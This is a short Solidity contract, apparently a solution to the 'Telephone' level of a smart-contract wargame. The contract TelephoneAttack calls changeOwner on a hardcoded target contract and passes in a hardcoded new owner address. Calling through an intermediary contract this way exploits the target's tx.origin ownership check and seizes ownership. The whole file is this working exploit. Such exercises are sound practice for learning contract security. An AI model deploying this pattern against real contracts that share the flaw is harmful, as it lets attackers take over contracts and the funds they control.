// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external ;
}

contract TelephoneAttack {

    Telephone public originalContract = Telephone(0x5A8d9762EA03726CdBE5A3BE3b0661B28de04fc5);

    function changeOwner() public {
        originalContract.changeOwner(0x960EfB4aA6380e31B5696dd1c57b3526CFc32e8c);
    }


}
